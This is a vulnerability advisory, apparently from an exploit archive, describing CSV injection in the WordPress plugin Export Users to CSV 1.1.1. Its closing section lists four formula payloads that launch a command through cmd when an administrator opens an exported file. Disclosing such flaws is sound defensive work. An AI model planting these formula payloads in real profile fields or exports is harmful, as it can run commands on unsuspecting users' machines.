@@ -1,0 +1,34 @@
+# Exploit Title: Wordpress Plugin Export Users to CSV 1.1.1 - CSV Injection
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-08-14
+# Google Dork: N/A
+# Vendor: Matt Cromwell
+# Software Link: https://wordpress.org/plugins/export-users-to-csv/
+# Affected Version: 1.1.1 and before
+# Active installations: +20,000
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: PHP
+# Tested on: Win10x64
+
+# 1. Plugin Description:
+# WordPress Export Users to CSV plugin exports user data and meta data. 
+# You can even export the users by role and registration date range.
+ 
+# 2. Technical Description:
+# WordPress Export users to CSV plugin version 1.1.1. and before are affected by Remote Code Execution 
+# through the CSV injection vulnerability. This allows an application user to inject commands as part 
+# of the fields of his profile and these commands are executed when a user with greater privilege 
+# exports the data in CSV and opens that file on his machine.
+ 
+# 3. Proof Of Concept (PoC):
+# Enter the payload =SUM(1+1)*cmd|' /C calc'!A0 in any field of the profile, for example, in biography.
+# When the user with high privileges logs in to the application, export data in CSV and opens the 
+# generated file, the command is executed and the calculator will run open on the machine.
+
+# 4. Payloads:
+=SUM(1+1)*cmd|' /C calc'!A0
++SUM(1+1)*cmd|' /C calc'!A0
+-SUM(1+1)*cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
